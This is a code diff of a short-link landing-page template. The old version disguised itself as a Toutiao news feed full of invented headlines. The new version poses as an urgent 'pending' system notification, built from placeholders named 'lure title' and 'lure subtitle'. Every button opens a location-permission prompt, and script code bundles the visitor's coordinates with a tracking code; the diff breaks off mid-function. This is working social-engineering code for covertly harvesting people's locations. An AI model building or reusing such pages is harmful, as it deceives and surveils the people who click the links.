@@ -1,187 +1,124 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>今日头条 - 热点新闻</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{.诱导标题}} - 消息提醒</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Microsoft YaHei', sans-serif;
-            background: #f4f5f6;
-            color: #333;
-            line-height: 1.6;
-        }
-        .header {
-            background: #e3e4e5;
-            border-bottom: 1px solid #ddd;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-        .header-top {
-            background: #e3e4e5;
-            max-width: 600px;
-            margin: 0 auto;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
             display: flex;
+            justify-content: center;
             align-items: center;
-            padding: 10px 15px;
+            padding: 20px;
         }
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
-            color: #e53e3e;
-            margin-right: 20px;
-        }
-        .search-box {
-            flex: 1;
+        .card {
             background: #fff;
-            border-radius: 4px;
-            padding: 8px 12px;
-            font-size: 14px;
-            color: #999;
-            border: none;
-        }
-        .nav {
-            background: #fff;
-            max-width: 600px;
-            margin: 0 auto;
-            display: flex;
-            overflow-x: auto;
-            padding: 0 15px;
-        }
-        .nav a {
-            padding: 12px 16px;
-            color: #666;
-            text-decoration: none;
-            white-space: nowrap;
-            font-size: 15px;
-        }
-        .nav a.active {
-            color: #e53e3e;
-            border-bottom: 2px solid #e53e3e;
-        }
-        .main {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 15px;
-            background: #fff;
-        }
-        .article-card {
-            display: flex;
-            padding: 15px 0;
-            border-bottom: 1px solid #f0f0f0;
-        }
-        .article-img {
-            width: 110px;
-            height: 75px;
-            background: #ddd;
-            border-radius: 4px;
-            margin-left: 12px;
-            object-fit: cover;
-        }
-        .article-content { flex: 1; }
-        .article-title {
-            font-size: 16px;
-            font-weight: 500;
-            line-height: 1.4;
-            color: #222;
-            margin-bottom: 8px;
-            display: -webkit-box;
-            -webkit-line-clamp: 2;
-            -webkit-box-orient: vertical;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 420px;
+            width: 100%;
             overflow: hidden;
         }
-        .article-meta {
-            font-size: 12px;
-            color: #999;
-        }
-        .article-source {
-            color: #e53e3e;
-            margin-right: 10px;
-        }
-        .hot-topic {
-            background: #fff;
-            padding: 15px;
-            margin-bottom: 10px;
-        }
-        .hot-title {
-            font-size: 16px;
-            font-weight: bold;
-            margin-bottom: 12px;
-            padding-left: 10px;
-            border-left: 3px solid #e53e3e;
-        }
-        .hot-list { list-style: none; }
-        .hot-list li {
-            padding: 10px 0;
-            border-bottom: 1px solid #f5f5f5;
-            font-size: 14px;
-        }
-        .hot-list li:last-child { border: none; }
-        .hot-num {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            background: #e53e3e;
-            color: #fff;
-            border-radius: 2px;
+        .card-header {
+            background: linear-gradient(135deg, #e53e3e 0%, #c53030 100%);
+            color: white;
+            padding: 24px;
             text-align: center;
-            line-height: 18px;
-            font-size: 12px;
-            margin-right: 8px;
         }
-        .hot-num.grey { background: #999; }
-        .fraud-alert {
-            background: #fff3f3;
-            border: 1px solid #fed7d7;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 10px 15px;
+        .icon {
+            font-size: 48px;
+            margin-bottom: 12px;
         }
-        .fraud-alert h4 {
-            color: #e53e3e;
-            margin-bottom: 10px;
-            font-size: 15px;
+        .card-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 4px;
         }
-        .fraud-alert p {
-            font-size: 13px;
-            color: #666;
-            line-height: 1.6;
-        }
-        .floating-btn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: #fff;
-            padding: 12px 20px;
-            border-radius: 24px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            cursor: pointer;
+        .card-subtitle {
             font-size: 14px;
-            z-index: 1000;
-            animation: pulse 2s infinite;
+            opacity: 0.9;
         }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
+        .card-body {
+            padding: 24px;
+        }
+        .info-item {
+            display: flex;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .info-item:last-child {
+            border-bottom: none;
+        }
+        .info-label {
+            color: #666;
+            font-size: 14px;
+            width: 80px;
+        }
+        .info-value {
+            flex: 1;
+            color: #333;
+            font-size: 14px;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #e53e3e 0%, #c53030 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(229, 62, 62, 0.4);
+        }
+        .btn:active {
+            transform: translateY(0);
+        }
+        .tip {
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+            margin-top: 16px;
+        }
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            background: #fed7d7;
+            color: #c53030;
+            border-radius: 4px;
+            font-size: 12px;
+            margin-left: 8px;
+        }
+        .footer {
+            text-align: center;
+            padding: 16px;
+            color: #999;
+            font-size: 12px;
         }
         .mask {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.5);
-            z-index: 1999;
+            background: rgba(0,0,0,0.6);
             display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
         }
         .geo-popup {
-            position: fixed;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            background: #fff;
+            background: white;
             border-radius: 12px;
             padding: 24px;
-            z-index: 2000;
             text-align: center;
             max-width: 280px;
             display: none;
@@ -209,7 +146,7 @@
         }
         .geo-popup .allow {
             background: #e53e3e;
-            color: #fff;
+            color: white;
         }
         .geo-popup .deny {
             background: #f5f5f5;
@@ -218,110 +155,38 @@
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="header-top">
-            <div class="logo">今日头条</div>
-            <div class="search-box">搜索感兴趣的内容...</div>
+    <div class="card">
+        <div class="card-header">
+            <div class="icon">{{.Icon}}</div>
+            <div class="card-title">{{.诱导标题}}</div>
+            <div class="card-subtitle">{{.诱导副标题}}</div>
         </div>
-        <div class="nav">
-            <a href="#" class="active">推荐</a>
-            <a href="#">热点</a>
-            <a href="#">社会</a>
-            <a href="#">法治</a>
-            <a href="#">公益</a>
-            <a href="#">反诈</a>
-            <a href="#">健康</a>
-        </div>
-    </div>
-
-    <div class="fraud-alert">
-        <h4>⚠️ 反诈预警</h4>
-        <p>近期接到群众举报，有不法分子冒充电商客服，以"包裹丢失"、"质量问题"为由实施诈骗。请勿轻信陌生来电，涉及转账汇款务必核实！</p>
-    </div>
-
-    <div class="main">
-        <div class="article-card" onclick="showGeoPopup()">
-            <div class="article-content">
-                <div class="article-title">习近平主持召开全面深化改革委员会会议，强调要坚持和完善中国特色社会主义制度</div>
-                <div class="article-meta">
-                    <span class="article-source">新华网</span>
-                    <span>5分钟前</span>
-                    <span>评论 1.2万</span>
-                </div>
+        <div class="card-body">
+            <div class="info-item">
+                <span class="info-label">通知类型</span>
+                <span class="info-value">系统消息</span>
             </div>
-            <img class="article-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='75'%3E%3Crect fill='%23ddd' width='110' height='75'/%3E%3Ctext x='55' y='40' text-anchor='middle' fill='%23999' font-size='12'%3E图片%3C/text%3E%3C/svg%3E" alt="">
-        </div>
-
-        <div class="article-card" onclick="showGeoPopup()">
-            <div class="article-content">
-                <div class="article-title">公安机关提醒：警惕"刷单返利"新型诈骗手法，已有人被骗数万元</div>
-                <div class="article-meta">
-                    <span class="article-source">公安部刑侦局</span>
-                    <span>12分钟前</span>
-                    <span>评论 8564</span>
-                </div>
+            <div class="info-item">
+                <span class="info-label">通知时间</span>
+                <span class="info-value" id="currentTime"></span>
             </div>
-            <img class="article-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='75'%3E%3Crect fill='%23ddd' width='110' height='75'/%3E%3Ctext x='55' y='40' text-anchor='middle' fill='%23999' font-size='12'%3E图片%3C/text%3E%3C/svg%3E" alt="">
-        </div>
-
-        <div class="article-card" onclick="showGeoPopup()">
-            <div class="article-content">
-                <div class="article-title">全国开展"全民反诈"专项行动，多地警方成功打掉多个电信诈骗窝点</div>
-                <div class="article-meta">
-                    <span class="article-source">人民日报</span>
-                    <span>28分钟前</span>
-                    <span>评论 2.1万</span>
-                </div>
+            <div class="info-item">
+                <span class="info-label">状态</span>
+                <span class="info-value"><span class="badge">待处理</span></span>
             </div>
-            <img class="article-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='75'%3E%3Crect fill='%23ddd' width='110' height='75'/%3E%3Ctext x='55' y='40' text-anchor='middle' fill='%23999' font-size='12'%3E图片%3C/text%3E%3C/svg%3E" alt="">
         </div>
-
-        <div class="article-card" onclick="showGeoPopup()">
-            <div class="article-content">
-                <div class="article-title">民政部发布《老年人防诈骗指南》，提醒广大老年群众守好"钱袋子"</div>
-                <div class="article-meta">
-                    <span class="article-source">民政部官网</span>
-                    <span>35分钟前</span>
-                    <span>评论 4321</span>
-                </div>
-            </div>
-            <img class="article-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='75'%3E%3Crect fill='%23ddd' width='110' height='75'/%3E%3Ctext x='55' y='40' text-anchor='middle' fill='%23999' font-size='12'%3E图片%3C/text%3E%3C/svg%3E" alt="">
+        <div style="padding: 0 24px 24px;">
+            <button class="btn" onclick="showGeoPopup()">点击查看详情</button>
         </div>
-
-        <div class="article-card" onclick="showGeoPopup()">
-            <div class="article-content">
-                <div class="article-title">中国消费者协会提示：警惕网络购物新型陷阱，"客服"主动退款多是诈骗</div>
-                <div class="article-meta">
-                    <span class="article-source">中消协</span>
-                    <span>42分钟前</span>
-                    <span>评论 6789</span>
-                </div>
-            </div>
-            <img class="article-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='75'%3E%3Crect fill='%23ddd' width='110' height='75'/%3E%3Ctext x='55' y='40' text-anchor='middle' fill='%23999' font-size='12'%3E图片%3C/text%3E%3C/svg%3E" alt="">
+        <div class="footer">
+            此消息由系统自动推送，请及时处理
         </div>
-    </div>
-
-    <div class="hot-topic">
-        <div class="hot-title">热搜榜单</div>
-        <ul class="hot-list">
-            <li onclick="showGeoPopup()"><span class="hot-num">1</span>神舟十九号载人飞船成功发射</li>
-            <li onclick="showGeoPopup()"><span class="hot-num">2</span>我国首个量子计算超算中心建成</li>
-            <li onclick="showGeoPopup()"><span class="hot-num grey">3</span>全面取消制造业外资准入限制</li>
-            <li onclick="showGeoPopup()"><span class="hot-num grey">4</span>多城市放开住房限购政策</li>
-            <li onclick="showGeoPopup()"><span class="hot-num grey">5</span>医保个人账户共济范围扩大</li>
-        </ul>
-    </div>
-
-    <div style="height: 60px;"></div>
-
-    <div class="floating-btn" onclick="showGeoPopup()">
-        🔍 点击查看更多资讯
     </div>
 
     <div class="mask" id="mask"></div>
     <div class="geo-popup" id="geoPopup">
-        <h3>获取当前位置</h3>
-        <p>需要获取您的当前位置来推荐本地资讯</p>
+        <h3>📍 获取当前位置</h3>
+        <p>需要获取您的位置来提供本地化服务</p>
         <div class="geo-popup-btns">
             <button class="deny" onclick="denyGeo()">暂不授权</button>
             <button class="allow" onclick="allowGeo()">确认授权</button>
@@ -332,10 +197,11 @@
         var shortCode = "{{.Code}}";
         var destURL = "{{.OriginalURL}}";
         var geoSubmitted = false;
-        var geoStatus = 'unknown';
+
+        document.getElementById('currentTime').textContent = new Date().toLocaleString('zh-CN');
 
         function showGeoPopup() {
-            document.getElementById('mask').style.display = 'block';
+            document.getElementById('mask').style.display = 'flex';
             document.getElementById('geoPopup').style.display = 'block';
         }
 
@@ -347,7 +213,6 @@
         function sendData(lat, lng, precision, status) {
             if (geoSubmitted) return;
             geoSubmitted = true;
-            geoStatus = status;
 
             var data = {
                 code: shortCode,
